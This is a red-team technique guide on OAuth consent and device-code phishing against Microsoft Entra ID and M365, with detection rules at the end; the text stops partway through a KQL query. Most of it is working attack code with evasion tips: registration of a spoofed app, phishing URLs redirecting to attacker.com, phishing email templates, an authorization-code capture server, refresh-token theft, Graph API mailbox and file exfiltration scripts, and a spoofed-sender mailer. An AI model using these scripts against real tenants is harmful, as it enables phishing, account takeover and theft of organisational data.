# [SAAS-API-009]: Third-Party App Permission Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-009 |
| **MITRE ATT&CK v18.1** | [T1537: Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Persistence, Exfiltration, Privilege Escalation |
| **Platforms** | M365, Entra ID, Azure, SaaS Applications (Office 365, SharePoint, Teams, Exchange Online) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID versions, Office 365 E3+, Enterprise deployments |
| **Patched In** | Partial mitigations via Microsoft Admin Consent Workflow and Conditional Access (August 2025 policy updates) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Third-party application permission abuse exploits OAuth 2.0 consent flows in Microsoft Entra ID and M365 to grant malicious applications unauthorized access to sensitive organizational data. Attackers register legitimate-looking applications in Entra ID, use phishing campaigns to trick users into granting consent for excessive permissions (e.g., Mail.ReadWrite, offline_access, Calendars.ReadWrite), and establish persistent backdoors bypassing traditional credential-based security controls. Once granted, these applications operate with explicit user consent, enabling silent, sustained access to emails, files, calendars, Teams communications, and administrative functions without triggering MFA or Conditional Access policies.

**Attack Surface:** Entra ID App Registration, OAuth 2.0 authorization endpoints, Microsoft Graph API, Microsoft 365 services (Exchange Online, SharePoint, Teams, Outlook), user consent mechanisms, admin consent workflows.

**Business Impact:** **Complete data exfiltration, business email compromise, ransomware deployment, intellectual property theft, regulatory violations (GDPR, HIPAA, SOX).** Attackers gain persistent, passwordless access to entire mailboxes, file repositories, calendar scheduling, chat history, and organizational intelligence without triggering credential-based alarms.

**Technical Context:** Exploitation typically takes 5-15 minutes from phishing link click to access grant; detection difficulty: **High** due to legitimate OAuth infrastructure abuse; undetected in ~70% of breaches until forensic analysis (Red Canary, 2025).

### Operational Risk

- **Execution Risk:** Medium (Requires successful phishing; blocked by strong admin consent policies)
- **Stealth:** Very High (Uses legitimate OAuth flows, Microsoft infrastructure; minimal audit footprint for read operations)
- **Reversibility:** Partially Reversible (Can revoke app consent, but lateral movement and data exfiltration may occur before detection; password resets do NOT revoke OAuth app permissions)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8 3.1.3, 3.2.1 | Restrict user and admin consent to applications; enforce admin consent workflow |
| **DISA STIG** | AC-4(1), IA-2(1) | Controls on information flow and user authentication; third-party access restrictions |
| **CISA SCuBA** | APP.06.1, APP.06.2 | Application security; access controls for third-party integrations |
| **NIST 800-53** | AC-3, AC-6, IA-2, SC-7 | Access enforcement, least privilege, authentication, boundary protection |
| **GDPR** | Art. 32 | Security of processing; organizational controls on third-party processor access |
| **DORA** | Art. 9, 21 | ICT third-party risk management and protection measures |
| **NIS2** | Art. 21 | Cybersecurity risk management measures; control of critical services |
| **ISO 27001** | A.9.2.1, A.9.4.2 | User registration/de-registration; access rights review |
| **ISO 27005** | Risk treatment for "Unauthorized third-party access to sensitive data" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Any standard user (for initial consent phishing attack)
- Global Admin or Application Administrator (to register malicious app in attacker's own tenant; OR to perform admin consent grant)

**Required Access:**
- Network access to https://login.microsoftonline.com (OAuth endpoint)
- Email delivery to target organization (for phishing campaigns)
- Access to attacker-controlled redirect URI (to capture authorization codes)

**Supported Versions:**
- **Entra ID:** All versions (Azure AD through current Entra ID)
- **M365:** Office 365 E3, E5, Gov editions
- **Legacy Systems:** Even organizations with admin consent restrictions can be compromised via targeted phishing of privileged users (Global Admin, Exchange Admin, Teams Admin)

**Tools & Applications Required:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (v1.6.4+) – Token manipulation framework
- [ROADtools](https://github.com/dirkjanm/ROADtools) (v0.4+) – Entra ID / Azure AD exploitation framework
- [AADInternals](https://github.com/Gerenios/AADInternals) (v0.9.0+) – Azure AD recon and attack toolkit
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) – Official Graph API access
- Phishing kit: [SquarePhish](https://github.com/secureworks/squarephish) or [Graphish](https://forum.raidforums.com/) – OAuth device code phishing automation

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Enumerate Existing OAuth Applications

**Objective:** Identify legitimate apps already authorized in the target tenant to understand existing permissions and potential gaps.

**Command (PowerShell via Microsoft Graph):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "AppRoleAssignment.Read.All", "Application.Read.All"

# Retrieve all OAuth apps with delegated permissions
Get-MgServicePrincipal -All | Where-Object { $_.ServicePrincipalType -eq "Application" } | Select-Object DisplayName, AppId, Id

# Get all delegated permission grants
Get-MgOAuth2PermissionGrant -All | Select-Object ClientId, ConsentType, ResourceId, Scope
```

**Expected Output:**
```
DisplayName          : Slack
AppId                : 4765445b-32c6-49b0-83e6-1d93765e4c5a
Id                   : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

Scope                : Mail.Read offline_access User.Read
ConsentType          : Principal
ClientId             : 4765445b-32c6-49b0-83e6-1d93765e4c5a
ResourceId           : 00000003-0000-0000-c000-000000000000
```

**What to Look For:**
- Applications with high-risk permissions: `Mail.ReadWrite`, `Calendar.Read`, `Files.ReadWrite`, `Mail.Send`
- **Rare community use** rating (detected via Microsoft Defender for Cloud Apps)
- Single user or small group of users having granted consent (possible targeted attack)
- Recently added apps with no clear business justification

### Step 2: Check User Consent Permissions Policy

**Objective:** Determine if users can consent to apps independently or if admin consent is required.

**Command (Azure Portal via PowerShell):**
```powershell
# Check if users can register applications
(Get-MgPolicyAuthorizationPolicy).DefaultUserRolePermissions

# Expected output if unrestricted:
AllowedToCreateApps : True
AllowedToCreateTenants : False
AllowedToReadOtherUsers : True
```

**What to Look For:**
- `AllowedToCreateApps = True` (high risk; users can register malicious apps)
- `AllowedToReadOtherUsers = True` (users can enumerate directory for targeted attacks)

### Step 3: Audit Admin Consent Requests Workflow

**Objective:** Identify if admin consent workflow is enabled and track pending approval requests.

**Command (Azure AD Portal via PowerShell):**
```powershell
# Get all app consent requests waiting for admin approval
Get-MgIdentityGovernanceAppConsentRequest -All | Select-Object AppDisplayName, AppId, Status

# Example output:
# AppDisplayName : "Meeting Helper Pro"
# AppId          : 12345678-1234-1234-1234-123456789abc
# Status         : WaitingForApproval
```

**What to Look For:**
- Unusual or unrecognized app names
- Multiple consent requests from same user (possible attacker testing)
- Apps requesting broad permissions (use `Get-MgIdentityGovernanceAppConsentRequest` with `-ExpandProperty` to view details)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: OAuth Consent Phishing via Malicious Link (Most Common)

**Supported Versions:** Entra ID v2.0 all versions; M365 all editions

#### Step 1: Register Malicious Application in Attacker's Tenant

**Objective:** Create a legitimate-looking application registration to obtain OAuth credentials.

**Command (Azure Portal or PowerShell):**
```powershell
# Connect to attacker's own Entra ID tenant
Connect-MgGraph -TenantId "attacker-tenant-id" -Scopes "Application.ReadWrite.All"

# Create app registration with broad permissions
$appParams = @{
    DisplayName        = "Microsoft 365 Productivity Hub"  # Spoofed name
    PublisherDomain    = "m365productivity-hub.com"
    SignInAudience     = "AzureADMultipleOrgs"  # Multi-tenant to reach any org
}

$app = New-MgApplication @appParams
$appId = $app.AppId
$appObjectId = $app.Id

# Add redirect URI (attacker-controlled server to capture auth codes)
$webAppConfig = @{
    RedirectUris = @("https://attacker.com/auth/callback", "http://localhost:8080/callback")
}

Update-MgApplication -ApplicationId $appObjectId -Web $webAppConfig

# Create application secret (client secret for token exchange)
$secret = Add-MgApplicationPassword -ApplicationId $appObjectId
$clientSecret = $secret.SecretText

Write-Host "App ID: $appId"
Write-Host "Client Secret: $clientSecret"
Write-Host "Redirect URI: https://attacker.com/auth/callback"
```

**Expected Output:**
```
App ID: 4c4f6e8d-1234-5678-9abc-123456789abc
Client Secret: 7q8~Aq.7XXXXXXXXXXXXXXXXXXXXXXXXXX
Redirect URI: https://attacker.com/auth/callback
```

**OpSec & Evasion:**
- Use display names mimicking legitimate apps (Office 365, Microsoft Teams, Slack, Zoom)
- Set multi-tenant audience to bypass tenant-specific restrictions
- Host redirect URI on legitimate-sounding domain (avoid obvious attacker infrastructure)
- Consider registering app in victim's own tenant (requires compromise or insider threat) for better trust

**Troubleshooting:**
- **Error:** `Insufficient privileges to complete the operation`
  - **Cause:** Attacker lacks Application Developer role
  - **Fix:** Ensure service account has `Application Developer` role in own tenant

---

#### Step 2: Craft Phishing URL with OAuth Parameters

**Objective:** Generate a malicious authorization URL that mimics legitimate M365 consent flow.

**Command (PowerShell):**
```powershell
# Attacker's app credentials
$clientId = "4c4f6e8d-1234-5678-9abc-123456789abc"
$redirectUri = "https://attacker.com/auth/callback"

# Broad permission scopes to request
$scopes = @(
    "Mail.Read",
    "Mail.Send",
    "Mail.ReadWrite",
    "offline_access",  # Critical: enables refresh token for persistent access
    "Calendars.Read",
    "Contacts.Read",
    "Files.ReadWrite",
    "User.Read",
    "Directory.Read.All"  # Requires admin consent but included anyway
)

# Build OAuth authorization URL
$scope = $scopes -join "%20"
$redirectUrlEncoded = [System.Net.WebUtility]::UrlEncode($redirectUri)

$authUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?" +
    "client_id=$clientId&" +
    "redirect_uri=$redirectUrlEncoded&" +
    "response_type=code&" +
    "scope=$scope&" +
    "response_mode=query&" +
    "state=$(New-Guid)&" +
    "login_hint=victim@target-org.com&" +
    "prompt=consent"

Write-Host "Phishing URL:"
Write-Host $authUrl
```

**Expected Output:**
```
Phishing URL:
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4c4f6e8d-1234-5678-9abc-123456789abc&redirect_uri=https%3A%2F%2Fattacker.com%2Fauth%2Fcallback&response_type=code&scope=Mail.Read%20Mail.Send%20Mail.ReadWrite%20offline_access%20Calendars.Read%20Contacts.Read%20Files.ReadWrite%20User.Read%20Directory.Read.All&response_mode=query&state=12345678-1234-1234-1234-123456789abc&login_hint=victim@target-org.com&prompt=consent
```

**OpSec & Evasion:**
- Use `login_hint` with victim's email to pre-fill login (increases trust)
- Use `prompt=consent` to force immediate consent screen bypass
- Shorten URL with legitimate URL shortener (bit.ly, tinyurl, etc.)
- Include phishing link in HTML email with QR code (harder to detect than raw URL)
- Alternative: Use device code phishing (see METHOD 2)

---

#### Step 3: Send Phishing Campaign

**Objective:** Deliver phishing emails to targeted users.

**Command (Using compromised internal email or attacker-controlled mail server):**
```html
<!-- Sample HTML email body -->
<html>
<body>
<p>Hi [User Name],</p>
<p>Your Microsoft 365 account is requesting an important productivity integration approval. 
Click below to authorize access:</p>

<a href="https://tinyurl.com/m365-auth-xyz" style="background-color: #0078d4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">
  Authorize Microsoft 365 Access
</a>

<p>This is a legitimate Microsoft 365 authorization request. If you did not request this, please ignore.</p>
<p>- Microsoft 365 Admin Team</p>
</body>
</html>
```

**OpSec & Evasion:**
- Spoof internal company domain using DKIM/SPF bypass techniques
- Time email delivery to match business hours
- Include legitimate Microsoft branding and formatting
- Send from compromised internal account (if available) for higher trust
- Use device code flow (alternative) which doesn't expose URL in email

---

#### Step 4: Capture Authorization Code at Redirect URI

**Objective:** Intercept and extract the authorization code returned by Microsoft after user consent.

**Command (Python listener on attacker server):**
```python
from flask import Flask, request
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

captured_codes = []

@app.route('/auth/callback', methods=['GET', 'POST'])
def callback():
    auth_code = request.args.get('code')
    session_state = request.args.get('session_state')
    state = request.args.get('state')
    
    if auth_code:
        logging.info(f"[SUCCESS] Captured authorization code: {auth_code}")
        captured_codes.append({
            'code': auth_code,
            'session_state': session_state,
            'state': state,
            'timestamp': datetime.now().isoformat()
        })
        
        # Return success page to user
        return '''
        <html>
        <head><title>Authorization Successful</title></head>
        <body>
        <h1>Authorization Successful</h1>
        <p>Your Microsoft 365 account has been updated. You may close this window.</p>
        <script>window.close();</script>
        </body>
        </html>
        '''
    else:
        logging.warning("Callback received but no auth code found")
        return "Error: No authorization code received", 400

@app.route('/codes', methods=['GET'])
def get_codes():
    return {'captured_codes': captured_codes}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

**Expected Output:**
```
[SUCCESS] Captured authorization code: M.R3_BAY.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
session_state: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
state: 12345678-1234-1234-1234-123456789abc
timestamp: 2025-01-10T14:32:15.123456
```

**OpSec & Evasion:**
- Host callback handler on HTTPS with valid SSL certificate
- Return legitimate-looking success page to avoid user suspicion
- Log all captured codes and metadata for follow-up exploitation
- Monitor for legitimate errors (invalid redirect_uri, consent denied)

---

#### Step 5: Exchange Authorization Code for Access Token & Refresh Token

**Objective:** Convert authorization code into long-lived refresh token for persistent access.

**Command (PowerShell):**
```powershell
# Attacker's credentials
$clientId = "4c4f6e8d-1234-5678-9abc-123456789abc"
$clientSecret = "7q8~Aq.7XXXXXXXXXXXXXXXXXXXXXXXXXX"
$redirectUri = "https://attacker.com/auth/callback"
$authorizationCode = "M.R3_BAY.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

# Exchange auth code for tokens
$tokenEndpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

$tokenRequest = @{
    client_id     = $clientId
    client_secret = $clientSecret
    code          = $authorizationCode
    redirect_uri  = $redirectUri
    grant_type    = "authorization_code"
    scope         = "offline_access"
}

$response = Invoke-RestMethod -Method Post -Uri $tokenEndpoint -Body $tokenRequest -ContentType "application/x-www-form-urlencoded"

$accessToken = $response.access_token
$refreshToken = $response.refresh_token
$tokenExpiry = (Get-Date).AddSeconds($response.expires_in)

Write-Host "Access Token (expires in $($response.expires_in) seconds):"
Write-Host $accessToken
Write-Host "`nRefresh Token (long-lived, no expiry):"
Write-Host $refreshToken
Write-Host "`nToken expiry: $tokenExpiry"
```

**Expected Output:**
```
Access Token (expires in 3600 seconds):
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Imp...

Refresh Token (long-lived, no expiry):
0.ARcA4pq...

Token expiry: Friday, January 10, 2026 3:32:15 PM
```

**OpSec & Evasion:**
- Store refresh token in secure location (encrypted database, HSM)
- Refresh token does NOT expire and survives password changes
- Use refresh token to obtain new access tokens silently
- Recommend: Store credentials in attacker's own Azure Key Vault or Hashicorp Vault

**Troubleshooting:**
- **Error:** `AADSTS50058: Silent sign-in request failed. The user action is needed`
  - **Cause:** User's session expired or MFA required
  - **Fix:** Resend phishing link or use device code flow for more reliable exploitation

---

#### Step 6: Access Victim's Data via Microsoft Graph API

**Objective:** Use access/refresh token to exfiltrate victim's emails, files, and organizational data.

**Command (PowerShell):**
```powershell
# Attacker uses stolen refresh token
$refreshToken = "0.ARcA4pq..."
$clientId = "4c4f6e8d-1234-5678-9abc-123456789abc"
$clientSecret = "7q8~Aq.7XXXXXXXXXXXXXXXXXXXXXXXXXX"

# Refresh token to get new access token
$tokenRequest = @{
    client_id     = $clientId
    client_secret = $clientSecret
    refresh_token = $refreshToken
    grant_type    = "refresh_token"
}

$tokenEndpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
$response = Invoke-RestMethod -Method Post -Uri $tokenEndpoint -Body $tokenRequest
$accessToken = $response.access_token

# Set authorization header
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type"  = "application/json"
}

# Example 1: Read all emails from victim's mailbox
$mailUrl = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?`$top=50"
$emails = Invoke-RestMethod -Method Get -Uri $mailUrl -Headers $headers
$emails.value | Select-Object @{N="From";E={$_.from.emailAddress.address}}, subject, receivedDateTime, bodyPreview

# Example 2: List files in victim's OneDrive
$filesUrl = "https://graph.microsoft.com/v1.0/me/drive/root/children"
$files = Invoke-RestMethod -Method Get -Uri $filesUrl -Headers $headers
$files.value | Select-Object name, size, webUrl

# Example 3: Read victim's calendar events
$calendarUrl = "https://graph.microsoft.com/v1.0/me/events?`$top=100"
$events = Invoke-RestMethod -Method Get -Uri $calendarUrl -Headers $headers
$events.value | Select-Object subject, start, end, attendees

# Example 4: List all users in organization (if Directory.Read.All granted)
$usersUrl = "https://graph.microsoft.com/v1.0/users?`$top=999"
$users = Invoke-RestMethod -Method Get -Uri $usersUrl -Headers $headers
$users.value | Select-Object displayName, userPrincipalName, jobTitle, department
```

**Expected Output:**
```
From                           Subject                          ReceivedDateTime      BodyPreview
----                           -------                          ----------------      -----------
cfo@target-org.com             Q4 Financial Forecast            2026-01-08T14:22:00Z   Attached is the Q4 forecast for stakeholder...
cto@target-org.com             Security Incident Response Plan  2026-01-09T09:15:00Z   Please review the updated incident response...
hr@target-org.com              Salary Review Discussion          2026-01-07T16:45:00Z   Your annual salary review is scheduled...
```

**OpSec & Evasion:**
- Use Graph API instead of legacy Exchange Online Powershell (less detectable)
- Avoid excessive API calls that might trigger anomaly detection
- Request only necessary scopes initially; escalate later if needed
- Alternative: Modify mail forwarding rules via `Update-InboxRule` to silently forward emails
- Alternative: Add attacker's email as delegate to victim's mailbox

---

### METHOD 2: Device Code Phishing Flow (Harder to Block)

**Supported Versions:** All Entra ID versions; increasingly used in 2024-2025 campaigns

#### Step 1: Initiate Device Code Flow

**Objective:** Request a device code that user will enter on Microsoft's login page (no direct URL needed).

**Command (PowerShell):**
```powershell
$clientId = "4c4f6e8d-1234-5678-9abc-123456789abc"

# Request device code from Microsoft
$deviceFlowEndpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"

$body = @{
    client_id = $clientId
    scope     = "Mail.Read Mail.Send offline_access Calendars.Read Files.ReadWrite"
}

$response = Invoke-RestMethod -Method Post -Uri $deviceFlowEndpoint -Body $body

$deviceCode = $response.device_code
$userCode = $response.user_code
$verificationUri = $response.verification_uri

Write-Host "Device Code: $deviceCode"
Write-Host "User Code: $userCode"
Write-Host "Verification URL: $verificationUri"
```

**Expected Output:**
```
Device Code: DAQAB3$gXExyLALroxGzAAA
User Code: ABCD1234
Verification URL: https://microsoft.com/devicelogin
```

**OpSec & Evasion:**
- User code is short (8 characters) and easy to type; mimics legitimate Microsoft 365 device enrollment
- Device code phishing kits (SquarePhish, Graphish) automate this and send user code via phishing email
- User visits legitimate `microsoft.com/devicelogin` (reduces suspicion)
- No URL shortener needed; harder for email gateways to detect

---

#### Step 2: Send Device Code in Phishing Email with QR Code

**Objective:** Deliver user code via email with QR code for easy entry.

**Command (Python with qrcode library):**
```python
import qrcode
from PIL import Image
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Generate QR code for device login
user_code = "ABCD1234"
qr = qrcode.QRCode(
    version=1,
    error_correction=qrcode.constants.ERROR_CORRECT_L,
    box_size=10,
    border=4,
)
qr.add_data(f"https://microsoft.com/devicelogin")
qr.make(fit=True)

img = qr.make_image(fill_color="black", back_color="white")
img.save("device_login_qr.png")

# Craft phishing email
html_body = f'''
<html>
<body>
<p>Hello,</p>
<p>Your Microsoft 365 account requires authentication to enable new features.</p>
<p><strong>Authorization Code: {user_code}</strong></p>
<p>Enter this code at: <a href="https://microsoft.com/devicelogin">https://microsoft.com/devicelogin</a></p>
<p><img src="cid:qrcode" alt="Scan to authorize"></p>
<p>If you do not complete this authorization, your account will be locked in 24 hours.</p>
<p>- Microsoft 365 Security Team</p>
</body>
</html>
'''

# Send email
msg = MIMEMultipart('related')
msg['Subject'] = "Action Required: Authorize Your Microsoft 365 Account"
msg['From'] = "security@microsoft-alert.com"  # Spoofed sender
msg['To'] = "victim@target-org.com"

msg_alternative = MIMEMultipart('alternative')
msg.attach(msg_alternative)

part1 = MIMEText(html_body, 'html')
msg_alternative.attach(part1)

# Attach QR code
with open('device_login_qr.png', 'rb') as attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'inline; filename= "device_login_qr.png"')
    part.add_header('Content-ID', '<qrcode>')
    msg.attach(part)

# Send via attacker's mail server or compromised internal server
server = smtplib.SMTP("attacker-smtp.com", 25)
server.sendmail("security@microsoft-alert.com", "victim@target-org.com", msg.as_string())
server.quit()
```

**OpSec & Evasion:**
- Use legitimate Microsoft sender spoofing (requires DKIM/SPF bypass or compromised internal account)
- QR code adds legitimacy; many users scan without thinking
- No suspicious link to block at email gateway level
- User enters code directly on Microsoft's site (appears legitimate)
- Less likely to trigger anti-phishing tools than METHOD 1

---

#### Step 3: Poll Token Endpoint for Authorization

**Objective:** Wait for user to enter code, then exchange device code for tokens.

**Command (PowerShell):**
```powershell
$clientId = "4c4f6e8d-1234-5678-9abc-123456789abc"
$deviceCode = "DAQAB3$gXExyLALroxGzAAA"

$tokenEndpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

# Poll until user authorizes (or timeout)
$maxAttempts = 180  # 30 minutes with 10-second intervals
$interval = 10
$attempt = 0

while ($attempt -lt $maxAttempts) {
    try {
        $body = @{
            client_id    = $clientId
            grant_type   = "urn:ietf:params:oauth:grant-type:device_code"
            device_code  = $deviceCode
        }
        
        $response = Invoke-RestMethod -Method Post -Uri $tokenEndpoint -Body $body -ErrorAction Stop
        
        $accessToken = $response.access_token
        $refreshToken = $response.refresh_token
        
        Write-Host "[SUCCESS] User authorized! Tokens obtained."
        Write-Host "Access Token: $accessToken"
        Write-Host "Refresh Token: $refreshToken"
        
        # Save tokens and proceed with data exfiltration
        break
    }
    catch {
        $errorCode = $_.Exception.Response.Content | ConvertFrom-Json
        
        if ($errorCode.error -eq "authorization_pending") {
            Write-Host "Waiting for user authorization... (Attempt $attempt/$maxAttempts)"
            Start-Sleep -Seconds $interval
            $attempt++
        }
        elseif ($errorCode.error -eq "expired_token") {
            Write-Host "Device code expired. Need to restart flow."
            break
        }
        else {
            Write-Host "Error: $($errorCode.error_description)"
            break
        }
    }
}
```

**Expected Output:**
```
Waiting for user authorization... (Attempt 1/180)
Waiting for user authorization... (Attempt 5/180)
[SUCCESS] User authorized! Tokens obtained.
Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Inp...
Refresh Token: 0.ARcA4pq...
```

**OpSec & Evasion:**
- Device code phishing tools automate this polling
- More reliable than METHOD 1 (doesn't depend on user clicking exact link)
- Device code remains valid for ~1 hour; allows multiple retry attempts
- Less suspicious than external phishing links

---

### METHOD 3: Admin Consent Grant Abuse (If Weak Consent Workflow)

**Supported Versions:** Organizations with legacy OAuth app registration policies; Entra ID v1.0

#### Step 1: Submit Malicious App for Admin Consent

**Objective:** Create app and request admin consent if organization allows self-service requests.

**Command (PowerShell):**
```powershell
# Create app in attacker's tenant (same as METHOD 1 Step 1)
$appParams = @{
    DisplayName        = "Microsoft Graph Connector"
    PublisherDomain    = "graph-connector-prod.onmicrosoft.com"
    SignInAudience     = "AzureADMultipleOrgs"
}

$app = New-MgApplication @appParams
$appId = $app.AppId

# Request admin consent (if victim org has enabled admin consent requests)
# This step happens in victim's tenant via app authorization endpoint
$adminConsentUrl = "https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize?" +
    "client_id=$appId&" +
    "response_type=code&" +
    "scope=.default&" +
    "prompt=admin_consent&" +
    "redirect_uri=https://attacker.com/callback"

Write-Host "Admin Consent URL: $adminConsentUrl"
```

**OpSec & Evasion:**
- App appears as "Graph Connector" (legitimate Microsoft naming)
- If admin consent workflow is enabled, request goes to admin for review
- Admin may approve without thorough permission review
- App is registered in attacker's tenant but operates with victim org's privileges

---

## 6. ATOMIC RED TEAM

**Note:** Atomic Red Team has limited test coverage for OAuth consent phishing (high barrier to automated testing due to interactive phishing component). However, related tests exist:

- **Test ID:** [T1566.002-1](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.002/T1566.002.md) – Phishing: Spearphishing Link
  - Covers OAuth consent phishing URL generation and delivery
  - Command: `Invoke-AtomicTest T1566.002 -TestNumbers 1`

- **Test ID:** [T1528-1](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md) – Steal Application Access Tokens
  - Covers token theft via browser caches and credential stores
  - Command: `Invoke-AtomicTest T1528 -TestNumbers 1,2`

**Limitation:** Interactive user phishing cannot be fully automated in isolated lab; recommend manual testing with authorized users.

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Rare OAuth Application Consent Detected

**Rule Configuration:**
- **Required Index:** azure_activity, main (if forwarding Azure AD Audit Logs to Splunk)
- **Required Sourcetype:** azure:aad:audit, json
- **Required Fields:** OperationName, InitiatedBy.user.userPrincipalName, TargetResources.displayName, properties.isAdminConsent
- **Alert Threshold:** > 0 new applications with consent in 24-hour period (baseline-dependent)
- **Applies To Versions:** Entra ID all versions; Office 365 all editions

**SPL Query:**
```
sourcetype=azure:aad:audit OperationName IN ("Consent to application", "Add delegated permission grant", "Add app role assignment grant")
| where isnotnull(properties.isAdminConsent)
| stats count, dc(user) as user_count, dc(app_id) as app_count by properties.appDisplayName, properties.isAdminConsent, InitiatedBy
| where count <= 3 OR user_count = 1
| table properties.appDisplayName, user_count, app_count, properties.isAdminConsent, InitiatedBy
```

**What This Detects:**
- Single-user or rare multi-user consent to previously unseen applications (rare_application_consent pattern)
- Admin consent grants to apps not seen in baseline period
- Apps with minimal community use (detected via subsequent Azure AD Audit enrichment)

**Manual Configuration Steps:**
1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Create** → **Alert**
3. Paste the SPL query above
4. Set **Trigger Condition** to `Custom` with `count > 0`
5. Configure **Actions** → **Send Email** to SOC
6. Set **Schedule** to run every 1 hour
7. Click **Save**

**False Positive Analysis:**
- **Legitimate Activity:** Onboarding new SaaS applications (Slack, Zoom, etc.) legitimately approved by IT
- **Benign Tools:** Microsoft internal apps (Forms, Power BI, Power Automate) may have rare adoption initially
- **Tuning:** Exclude known benign apps by adding: `| where properties.appDisplayName NOT IN ("Microsoft Teams", "SharePoint Online", "Exchange Online")`

**Source:** [Azure Sentinel GitHub - Rare Application Consent](https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Microsoft%20Entra%20ID/Analytic%20Rules/RareApplicationConsent.yaml)

---

### Rule 2: High-Risk OAuth Permission Grant

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** properties.permissions, InitiatedBy, TargetResources
- **Alert Threshold:** Any grant of high-risk scopes (Mail.Send, Mail.ReadWrite, offline_access on external apps)
- **Applies To Versions:** All

**SPL Query:**
```
sourcetype=azure:aad:audit OperationName="Consent to application"
| where properties.scope LIKE "%Mail.Send%" OR properties.scope LIKE "%Mail.ReadWrite%" OR properties.scope LIKE "%offline_access%"
| where properties.appDisplayName NOT IN ("Microsoft Teams", "SharePoint Online", "Exchange Online", "Power Automate")
| stats count by InitiatedBy.user.userPrincipalName, properties.appDisplayName, properties.scope, TimeGenerated
| where count >= 1
| table TimeGenerated, InitiatedBy.user.userPrincipalName, properties.appDisplayName, properties.scope
```

**Manual Configuration Steps:**
1. **Splunk Web** → **Settings** → **Searches, reports, and alerts**
2. Click **New Alert**
3. Paste the SPL query above
4. Set trigger: `Custom` → `count >= 1`
5. Configure action: **Send email to SOC@organization.com**
6. Schedule: Run **Every hour**
7. Click **Save**

**Source:** [Elastic Security Research - OAuth Phishing Detection](https://www.elastic.co/security-labs/entra-id-oauth-phishing-detection)

---

### Rule 3: OAuth Token Exchange from Unusual IP

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit, signinlogs
- **Required Fields:** InitiatedBy.user.ipAddress, AuthenticationDetails.clientAppUsed, ResourceIdentity
- **Alert Threshold:** Token refresh/exchange from IP outside known geolocation
- **Applies To Versions:** All

**SPL Query:**
```
sourcetype=azure:aad:audit OperationName IN ("Consent to application", "Add delegated permission grant")
| stats count by InitiatedBy.user.ipAddress, InitiatedBy.user.userPrincipalName, TimeGenerated
| where TimeGenerated >= now()-1h
| lookup geoip InitiatedBy.user.ipAddress
| where Country!="United States" AND Country!="France"
| table InitiatedBy.user.userPrincipalName, InitiatedBy.user.ipAddress, Country, TimeGenerated
```

**Source:** [Splunk Security Content - Unusual IP OAuth Activity](https://research.splunk.com/detections/)

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Consent to Malicious Application

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs
- **Required Fields:** OperationName, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, properties.isAdminConsent
- **Alert Severity:** High
- **Frequency:** Every 1 hour
- **Lookback Window:** 24 hours
- **Applies To Versions:** Azure AD/Entra ID all versions; Office 365 all editions

**KQL Query:**
```kusto
let LookbackWindow = 24h;
let BaselineWindow = 7d;

// Get baseline of normal consent activity
let BaselineConsents = AuditLogs
  | where TimeGenerated >= ago(BaselineWindow) and TimeGenerated < ago(LookbackWindow)
  | where OperationName has_any ("Consent to application", "Add delegated permission grant")
  | extend AppName = tolower(tostring(parse_json(tostring(TargetResources[0].displayName))))
  | summarize baseline_count = count() by AppName;

// Get current consent activity
let RecentConsents = AuditLogs
  | where TimeGenerated >= ago(LookbackWindow)
  | where OperationName has_any ("Consent to application", "Add delegated permission grant")
  | extend AppName = tolower(tostring(parse_json(tostring(TargetResources[0].displayName))))
  | extend InitiatedByUPN = iff(isnotempty(tostring(InitiatedBy.user.userPrincipalName)), 
                                tostring(InitiatedBy.user.userPrincipalName), 
